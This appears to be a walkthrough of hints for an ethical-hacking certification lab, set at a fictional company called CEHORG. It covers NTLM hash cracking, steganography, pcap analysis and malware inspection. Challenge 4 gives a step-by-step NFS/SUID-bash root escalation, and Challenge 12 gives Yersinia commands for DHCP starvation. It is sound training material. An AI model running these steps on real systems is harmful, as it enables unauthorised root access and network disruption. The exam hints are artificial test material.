# Part II

## Scenario

You have been hired as a part of the Red Team at CEHORG, an IT and ITES organization that deals with advanced research and development in the field of information security. It has offices all over the country connected in real-time by its network infrastructure.

Your organization is worried about rising cybersecurity incidents and has entrusted you with a comprehensive security audit of the complete infrastructure.

CEHORG’s internal network consists of several subnets housing various organizational units like any large organization. The front office is connected to a separate subnet that connects to the company’s public-facing computers. The company has installed multiple kiosks to help customers understand their products and services. The front office also has Wi-Fi connectivity to cater to the users who carry their smartphones and laptops.

The CEHORG’s internal network is made up of Militarized and Demilitarized zones. As a security precaution, and by design, all the internal resource zones are configured with different subnet IPs. The militarized zone houses the application servers that provide application frameworks for various departments. The Demilitarized Zone contains public-facing systems of the organization, such as web and mail servers. The headquarter’s network topology and protocols are replicated worldwide in all its satellite offices for easy communication with the headquarters.

### Challenge 1

You are assigned a task to crack the NTLM password hashes captured by the internal security team. The password hash has been stored in the Documents folder of the Parrot Security console machine. What is the password of user James? (Format: aaaaaa)

__hint:__ john --format=NT hashes.txt

### Challenge 2

You are assigned a task to crack the NTLM password hashes captured by the internal security team. The password hash has been stored in the Documents folder of the Parrot Security console machine. What is the password of user Jones? (Format: NNNNNNNN)

__hint:__ john --format=NT hashes.txt

### Challenge 3

You have been given a task to audit the passwords of a server present in CEHORG network. Find out the password of the user Adam and submit it. (Note: Use Administrator/ CSCPa$$ when asked for credentials). (Format: aaaaaaaaN)

__hint:__ (Windows 11) L0phtCrack password audit 10.10.10.25

### Challenge 4

You have got user-level access to the machine with IP 172.16.0.11. Your task is to escalate the privileges to that of the root user on the machine and read the content in the rootflag.txt file. (Note: all the flag files are located at the root, Desktop, Documents, or Downloads folder for the respective users/machines). Note: use LinuxPass when asked for machine password. (Format: aNNaaa*a)

__hint:__

1. nmap -sV 172.16.0.11
2. sudo apt install nfs-common
3. showmount -e 172.16.0.11
4. mkdir /tmp/nfs
5. sudo mount -t nfs 172.16.0.11:/home /tmp/nfs
6. cd /tmp/nfs
7. sudo cp /bin/bash .
8. sudo chmod +s bash
9. ssh -l ubuntu 172.16.0.11
10. cd /home
11. ./bash -p
12. cat /rootflag.txt

### Challenge 5

An employee in your organization is suspected of sending important information to an accomplice outside the organization. The incident response team has intercepted some files from the employee's system that they believe have hidden information. You are asked to investigate a file named Confidential.txt and extract hidden information. Find out the information hidden in the file. Note: The Confidential.txt file is located at C:\Users\Admin\Documents in EH Workstation – 2 machine. (Format: Aaaaa/AaaaaaaNNNNN)

__hint:__ snow -C Confidential.txt

### Challenge 6

The incident response team has intercepted an image file from a communication that is supposed to have just text. You are asked to investigate the file and check if it contains any hidden information. Find out the information hidden in the file. Note: The vacation.bmp file is located at C:\Users\Admin\Documents in EH Workstation – 2 machine. (Format: AAANNNNNNN)

__hint:__ OpenStego

### Challenge 7

A disgruntled employee in CEHORG has used the Covert_TCP utility to share a secret message with another user in the CEHORG network. Covert_TCP manipulates the TCP/IP header of the data packets to send a file one byte at a time from any host to a destination. It can be used to hide the data inside IP header fields. The employee used the IP ID field to hide the message. The network capture file “Capture.pcapng” has been retained in the “C:\Users\Administrator\Documents” directory of the “EH Workstation – 2” machine. Analyze the session to get the message that was transmitted. (Format: AN*A*AN)

__hint:__
1. tcp.srcport == 8888
2. Internet Protocol Version 4 - Identification

### Challenge 8

You are a malware analyst working for CEHORG. During your assessment within your organisation's network, you found a malware face.exe. The malware is extracted and placed at C:\Users\Admin\Documents in the EH Workstation – 2 machine. Analyze the malware and find out the File pos for KERNEL32.dll text. (Hint: exclude zeros.) (Format: AANN)

__hint:__ BinText

### Challenge 9

Analyze an ELF executable (Sample-ELF) file placed at C:\Users\Admin\Documents in the EH Workstation – 2 machines to determine the CPU Architecture it was built for. (Format: AAAAANN)

__hint:__ Detect It Easy, DIE

### Challenge 10

CEHORG has assigned you with analysing the snapshot of the operating system registry and perform the further steps as part of dynamic analysis and find out the whether the driver packages registry is changed. Give your response as Yes/No. (Format: Aaa)

__hint:__ Reg Organizer

### Challenge 11

Perform windows service monitoring and find out the service type associated with display name "afunix". (Format: aaaaaa)

__hint:__ Service Manager

### Challenge 12

Use Yersinia on the “EH Workstation – 1” (Parrot Security) machine to perform the DHCP starvation attack. Analyze the network traffic generated during the attack and find the Transaction ID of the DHCP Discover packets. (Format: NaNNNaNNNN)

__hint:__

1. wireshark
2. sudo yersinia -I
3. F2 switch to DHCP mode
4. x to list available attack options
5. 1 to send DISCOVER packet

### Challenge 13

CEHORG suspects a possible sniffing attack on a machine in its network. The organization has retained the network traffic data for the session and stored it in the Documents folder in EH Workstation – 2 (Windows 11) machine as sniffsession.pcap. You have been assigned a task to analyze and find out the protocol used for sniffing on its network. (Format: AAA)

__hint:__ Capsa Network Analyzer

### Challenge 14

As an ethical hacker, you are tasked to analyze the traffic capture file webtraffic.pcapng. Find out the packet's id that uses ICMP protocol to communicate. Note: The webtraffic.pcapng file is located at C:\Users\Administrator\Documents\ in the Documents folder on EH Workstation – 2 (Windows 11) machine. (Format: NaaaNN)

__hint:__ wireshark

### Challenge 15

CEHORG has found that one of its web application movies.cehorg.com running on its network is leaking credentials in plain text. You have been assigned a task of analysing the movies.pcap file and find out the leaked credentials. Note: The movies.pcapng file is located at C:\Users\Administrator\Documents\ in the Documents folder on EH Workstation – 2 (Windows 11) machine. Make a note of the credentials obtained in this flag, it will be used in the Part 4 of CEH Skill Check. (Format: Aaaaa/aaaaaaa)

__hint:__
1. wireshark
2. follow tcp stream 27
3. search txtpwd

### Challenge 16

An attacker has created a custom UDP packet and sent it to one of the machines in the CEHORG. You have been given a task to study the ""CustomUDP.pcapng"" file and find the data size of the UDP packet (in bytes). Note: The CustomUDP.pcapng file is located at C:\Users\Administrator\Documents\ in the Documents folder on EH Workstation – 2 (Windows 11) machine. (Format: NNN)

__hint:__ wireshark

### Challenge 17

A denial-of-service attack has been launched on a target machine in the CEHORG network. A network session file "DoS.pcapng" has been captured and stored in the Documents folder of the EH Workstation - 2 machine. Find the IP address of the attacker's machine. (Format: NNN.NNN.N.NN)

__hint:__ wireshark tcp.dstport == 80

### Challenge 18

CEHORG hosts a datacenter for its bussiness clients. While analyzing the network traffic it was observed that there was a huge surge of incoming traffic from multiple sources. You are given a task to analyze and study the DDoS.pcap file. The captured network session (DDoS.pcapng) is stored in the Documents folder of the EH Workstation -2 machine. Determine the number of machines that were used to initiate the attack. (Format: N)

__hint:__

1. wireshark tcp.dstport == 80
2. sort by source
